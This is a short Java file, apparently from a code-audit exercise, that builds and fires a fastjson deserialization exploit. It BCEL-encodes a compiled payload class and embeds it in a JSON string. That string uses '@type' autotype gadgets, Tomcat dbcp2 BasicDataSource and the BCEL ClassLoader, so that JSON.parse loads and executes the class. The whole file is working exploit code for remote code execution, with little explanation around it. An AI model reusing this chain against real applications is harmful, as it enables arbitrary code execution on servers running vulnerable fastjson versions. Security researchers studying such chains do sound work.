package BCEL;


import com.alibaba.fastjson.JSON;

import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.nio.file.Files;
import java.nio.file.Paths;

class exo {
    public static void main(String[] argv) throws Exception{
        byte[] bytes = Files.readAllBytes(Paths.get("F:\\代码审计\\java\\fastjson_exp\\src\\main\\java\\BCEL\\payload.class"));
        String code = Utility.encode(bytes,true);

        String poc = "{\n" +
                " {\n" +
                " \"aaa\": {\n" +
                " \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                " \"driverClassLoader\": {\n" +
                " \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                " },\n" +
                " \"driverClassName\": \"$$BCEL$$"+ code+ "\"\n" +
                " }\n" +
                " }: \"bbb\"\n" +
                "}";
        System.out.println(poc);
        JSON.parse(poc);
    }
}